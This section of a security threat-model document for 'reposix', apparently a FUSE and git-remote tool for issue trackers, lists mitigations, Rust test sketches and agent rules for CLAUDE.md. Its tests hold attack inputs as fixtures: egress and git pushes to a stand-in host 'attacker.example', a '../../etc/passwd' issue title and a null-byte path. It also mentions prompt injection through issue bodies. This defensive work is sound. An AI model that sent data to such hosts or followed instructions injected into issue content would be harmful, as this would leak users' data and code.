← [back to index](./index.md)

## PART D — Recommended Mitigations (Concrete)

Each item is a copy-pasteable artifact. Numbering continues from PART A.

### D.1 — New requirements for PROJECT.md `### Active`

Add the following bullets verbatim under `### Active`:

```markdown
- [ ] **Egress allowlist enforcement.** All outbound HTTP from the reposix process MUST go through a single `reqwest::Client` whose connector rejects any host not in `~/.config/reposix/allowed_hosts`. Default allowlist for v0.1: `127.0.0.1` and `localhost` only. No env-var override; config file only. (Cuts trifecta exfiltration leg per `docs/research/agentic-engineering-reference.md` §5.2.)
- [ ] **Allowlisted git push destinations.** `git-remote-reposix` MUST refuse `push` unless the remote URL is listed in `~/.config/reposix/allowed_remotes`. Default-deny. New entries require interactive TTY confirmation (`isatty(0)`); no flag bypass.
- [ ] **Tainted-content type discipline.** Every byte sourced from a network read MUST be wrapped in `Tainted<T>` in `reposix-core`. Privileged operations (push target derivation, audit log writes, shell command construction) MUST take `Untainted<T>` parameters and rely on the type system. Extraction via `into_quarantined_string()` logs the call site to the audit DB.
- [ ] **Server-authoritative field allowlist.** YAML frontmatter on push MUST be filtered to a closed allowlist defined in `reposix-core::SCHEMA`. Initial allowlist: `status`, `assignee`, `labels`, `body`. Unknown keys are dropped to stderr with a warning, never forwarded to the API.
- [ ] **Bulk-delete guard.** A single `git push` that deletes more than 5 files MUST be rejected unless invoked with `--force-bulk-delete`. Independent of git, FUSE `unlink` ops MUST be deferred to a local journal and only applied on `git push`, never synchronously to the API.
- [ ] **No HTTP redirects.** All `reqwest::Client` instances MUST be built with `redirect(redirect::Policy::none())`. 3xx responses are logged as errors.
- [ ] **Path validation at FUSE boundary.** Any FUSE op whose path component contains `/`, `\0`, or matches `^\.{1,2}$` MUST be rejected with `EINVAL`. Filenames are derived from issue IDs only, never from titles.
- [ ] **FUSE op timeouts.** Every FUSE op MUST have a hard timeout: 2s for `getattr`/`readdir`, 5s for `read`/`write`. On timeout, return `ETIMEDOUT`. Mount MUST be unmountable via `fusermount -u` within 3s of simulator death.
- [ ] **POSIX hardening.** Mount MUST use `nosuid,nodev,noexec` flags. FUSE daemon MUST reject `symlink`, `link`, `mknod`, `chmod` ops with `EPERM`.
- [ ] **Audit log redaction.** Issue body content MUST NOT be stored verbatim in the audit log. Only sha256 hashes plus metadata (issue ID, op, caller PID, timestamp, byte-count). The audit log file is mode `0600` and never network-shipped in v0.1.
```

### D.2 — New constraints for `### Constraints` in PROJECT.md

```markdown
- **Security architecture**: reposix follows the CaMeL split (`docs/research/agentic-engineering-reference.md` §5.4). The FUSE daemon (quarantined) parses untrusted content; the CLI orchestrator (privileged) issues push commands. The two communicate over a typed channel (`Tainted<T>` / `Untainted<T>`); push targets, branch names, and refspecs MUST originate from operator config and never from quarantined content.
- **Threat model document is authoritative**: `.planning/research/threat-model-and-critique.md` is the source of truth for security requirements. PRs that touch network code or FUSE ops MUST cite which threat-model item they address or explicitly note "no security impact" in the PR body.
```

### D.3 — Required tests (add to `tests/` and CI)

Each test name is the assertion. Pseudocode is illustrative; implement in Rust.

```rust
// tests/security_egress.rs

#[tokio::test]
async fn egress_to_non_allowlisted_host_is_rejected() {
    let client = reposix_core::http::client();
    let result = client.get("https://attacker.example/").send().await;
    assert!(matches!(result, Err(e) if e.is_connect()),
            "egress to non-allowlisted host must fail at connector level");
}

#[tokio::test]
async fn http_redirects_are_disabled() {
    let client = reposix_core::http::client();
    // simulator endpoint that 302s to attacker.example
    let result = client.get(&simulator.url("/redirect-test")).send().await;
    assert_eq!(result.unwrap().status(), 302,
               "client must surface 3xx, not follow it");
}
```

```rust
// tests/security_push_allowlist.rs

#[test]
fn push_to_unlisted_remote_is_rejected() {
    let repo = test_repo_with_remote("exfil", "https://attacker.example/repo.git");
    let result = run_remote_helper(&repo, "push", "refs/heads/main:refs/heads/main");
    assert_eq!(result.exit_code, 1);
    assert!(result.stderr.contains("not in allowed_remotes"));
}
```

```rust
// tests/security_frontmatter_allowlist.rs

#[test]
fn unknown_frontmatter_keys_are_dropped_on_push() {
    let issue = "---\nstatus: open\nowner: root\npermissions: 777\n---\nbody";
    let parsed = reposix_core::parse_for_push(issue).unwrap();
    assert_eq!(parsed.frontmatter.keys().collect::<Vec<_>>(),
               vec!["status"]);
    // Round-trip: re-fetch from sim, confirm `owner` and `permissions` are not set.
    let server_state = simulator.get_issue(parsed.id);
    assert!(server_state.get("owner").is_none());
    assert!(server_state.get("permissions").is_none());
}
```

```rust
// tests/security_path_traversal.rs

#[test]
fn path_with_dotdot_is_rejected() {
    let result = fuse.lookup(parent_inode, OsStr::new(".."));
    assert_eq!(result, Err(libc::EINVAL.into()));
}

#[test]
fn issue_title_with_slash_does_not_create_subdirectory() {
    sim.create_issue("PROJ-1", "../../etc/passwd");
    let entries = fuse.readdir(root_inode);
    let names: Vec<_> = entries.iter().map(|e| e.name.to_str().unwrap()).collect();
    assert_eq!(names, vec!["PROJ-1.md"], "filename must be ID-derived, not title-derived");
}

#[test]
fn null_byte_in_path_is_rejected() {
    let result = fuse.lookup(root_inode, OsStr::from_bytes(b"PROJ\0-1.md"));
    assert_eq!(result, Err(libc::EINVAL.into()));
}
```

```rust
// tests/security_concurrent_writes.rs

#[tokio::test]
async fn concurrent_writers_to_same_file_do_not_interleave() {
    let mount = test_mount();
    let a = tokio::spawn(write_full_file(&mount, "PROJ-1.md", "version-A"));
    let b = tokio::spawn(write_full_file(&mount, "PROJ-1.md", "version-B"));
    let _ = tokio::join!(a, b);
    let final_content = std::fs::read_to_string(mount.path("PROJ-1.md")).unwrap();
    assert!(final_content == "version-A" || final_content == "version-B",
            "byte-level interleaving observed: {:?}", final_content);
}
```

```rust
// tests/security_offline_simulator.rs

#[tokio::test]
async fn fuse_does_not_block_when_simulator_is_dead() {
    let mount = test_mount_with_dead_simulator();
    let start = Instant::now();
    let result = tokio::time::timeout(Duration::from_secs(7),
                                      tokio::task::spawn_blocking(move || {
                                          std::fs::metadata(mount.path("PROJ-1.md"))
                                      })).await;
    assert!(start.elapsed() < Duration::from_secs(6),
            "getattr must not block beyond timeout when simulator is dead");
    assert!(matches!(result.unwrap().unwrap(), Err(e) if e.kind() == ErrorKind::TimedOut));
}

#[tokio::test]
async fn mount_is_unmountable_within_3s_of_simulator_death() {
    let mount = test_mount();
    drop(simulator); // kill simulator
    let start = Instant::now();
    Command::new("fusermount").args(&["-u", mount.path()]).status().unwrap();
    assert!(start.elapsed() < Duration::from_secs(3));
}
```

```rust
// tests/security_bulk_delete_guard.rs

#[test]
fn rm_does_not_delete_remote_state_until_push() {
    create_issues_in_sim(50);
    fuse_mount();
    Command::new("rm").args(&["-rf", mount.path()]).status().unwrap();
    // Without push, simulator state is untouched
    assert_eq!(sim.list_issues().len(), 50);
}

#[test]
fn push_with_more_than_5_deletes_is_rejected() {
    let repo = test_repo_with_n_deletes(6);
    let result = run_remote_helper(&repo, "push", "refs/heads/main");
    assert_eq!(result.exit_code, 1);
    assert!(result.stderr.contains("--force-bulk-delete"));
}
```

```rust
// tests/security_audit_log_redaction.rs

#[test]
fn issue_body_is_never_written_to_audit_log() {
    let secret = "SECRET_TOKEN_THAT_MUST_NOT_LEAK";
    sim.create_issue("PROJ-1", &format!("body containing {}", secret));
    fuse.read(inode_for("PROJ-1.md"));
    let audit_db = open_audit_db();
    let all_rows: String = audit_db.query("SELECT * FROM events").join("\n");
    assert!(!all_rows.contains(secret),
            "audit log contains raw body content");
}

#[test]
fn audit_log_file_mode_is_0600() {
    let mode = std::fs::metadata(audit_log_path()).unwrap().permissions().mode();
    assert_eq!(mode & 0o777, 0o600);
}
```

```rust
// tests/security_taint_typing.rs

#[test]
fn push_target_cannot_be_derived_from_tainted_content() {
    // This is a compile-time assertion in real life.
    // Encoded as a doc test or trybuild ui test:
    //
    //     fn push(target: Untainted<Url>) { ... }
    //     let body: Tainted<String> = sim.fetch_body();
    //     push(body.parse_url()); // must not compile
    let t = trybuild::TestCases::new();
    t.compile_fail("tests/ui/tainted_into_push.rs");
}
```

### D.4 — New constraints for CLAUDE.md

Append to the project-local `.claude/CLAUDE.md` (or root CLAUDE.md):

```markdown
# reposix security invariants (non-negotiable)

These invariants OVERRIDE feature work. If implementing a feature would violate one, stop and surface to the operator.

1. **No outbound HTTP outside the egress allowlist.** All `reqwest::Client` instances must be constructed via `reposix_core::http::client()`. Direct `reqwest::Client::new()` is banned (clippy lint or grep gate in CI).
2. **No `git push` to unlisted remotes.** Any code path that calls `git push`, `git remote add`, or modifies `.git/config` must consult `reposix_core::git::allowed_remotes()`.
3. **No interpolation of network-sourced bytes into shell commands.** Use `std::process::Command::arg(...)`, never `Command::new("sh").arg("-c").arg(format!(...))` with content from a `Tainted<T>`.
4. **No frontmatter keys beyond the SCHEMA allowlist on push.** If you add a server-authoritative field, add it to `reposix_core::SCHEMA` and add a round-trip test.
5. **No FUSE op without a timeout wrapper.** All FUSE ops go through `reposix_fuse::with_timeout(...)`.
6. **No `unlink` that synchronously calls the API.** Deletes journal locally; push applies them.
7. **Audit log writes never include raw issue bodies.** Hash, then write the hash.
8. **PRs touching `reposix-core/src/http.rs`, `reposix-fuse/src/ops.rs`, or `reposix-remote/src/push.rs` require a security review note in the PR body** referencing which item in `.planning/research/threat-model-and-critique.md` is addressed (or "no security impact" with justification).
9. **Demo mode is not a security-relaxation mode.** `reposix demo` does not bypass any of the above.
10. **The simulator is not a trust boundary.** Treat simulator responses as tainted exactly as you would real Jira/GitHub responses. The simulator exists to let us *test* the trust boundary without burning real credentials, not to *avoid* having one.
```

### D.5 — Demo-script hardening

The demo recording (PROJECT.md L29) is a security-relevant artifact in itself. If the recording shows `git push` succeeding to a real `github.com` remote with no allowlist prompt, viewers will reasonably assume that's safe and copy the pattern. The demo MUST:

- Show the egress allowlist file before mounting.
- Show the `git push` allowlist prompt firing on first push to a new remote.
- Show one prompt-injection attempt in an issue body and the agent NOT following it (concrete demonstration of the tainted-type discipline).
- Show one bulk-delete attempt being refused.

If those four moments are not in the demo, the demo is dishonest about what reposix is.
